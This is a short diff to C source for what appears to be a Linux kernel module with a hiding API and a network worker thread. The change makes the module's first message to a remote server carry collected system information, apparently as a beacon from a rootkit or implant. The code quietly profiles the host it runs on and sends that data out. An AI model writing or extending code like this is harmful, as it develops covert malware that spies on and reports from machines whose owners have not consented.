@@ -1,5 +1,6 @@
 #include "hide_api.h"
 #include "network.h"
+#include "utils/sysinfo.h"
 
 static bool is_auth = false;
 static struct task_struct *network_worker_thread = NULL;
@@ -14,11 +15,21 @@ int set_user_auth(bool auth) {
 }
 
 static bool send_initial_message_with_retries(void) {
+    char *sysinfo = get_sysinfo();
+
+    if (!sysinfo) {
+        ERR_MSG("send_initial_message_with_retries: failed to get system info\n");
+        return false;
+    }
+
     for (int attempts = 0; attempts < MAX_MSG_SEND_OR_RECEIVE_ERROR; attempts++) {
-        if (send_to_server(message) == SUCCESS)
+        if (send_to_server(sysinfo) == SUCCESS) {
+            kfree(sysinfo);
             return true;
+        }
         msleep(TIMEOUT_BEFORE_RETRY);
     }
+    kfree(sysinfo);
     return false;
 }
 
